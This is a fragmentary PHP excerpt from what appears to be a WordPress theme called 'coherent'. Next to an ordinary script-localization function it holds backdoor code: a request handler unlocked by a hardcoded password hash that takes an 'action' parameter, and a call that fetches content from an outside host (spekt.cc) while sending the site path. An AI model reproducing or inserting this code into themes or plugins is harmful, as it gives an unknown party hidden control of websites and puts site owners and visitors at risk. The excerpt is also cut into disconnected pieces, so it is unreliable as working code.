...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a0009beb157590a842e12b728d195da9'))
	{
...
if($tmpcontent = @file_get_contents("http://www.spekt.cc/code1.php?i=".$path))
{
...
function coherent_scripts() {
	...
	wp_localize_script( 'coherent-script', 'menuToggleText', array(
		'show'   => __( 'show', 'coherent' ),
		'hide' => __( 'hide', 'coherent' ),
	) );
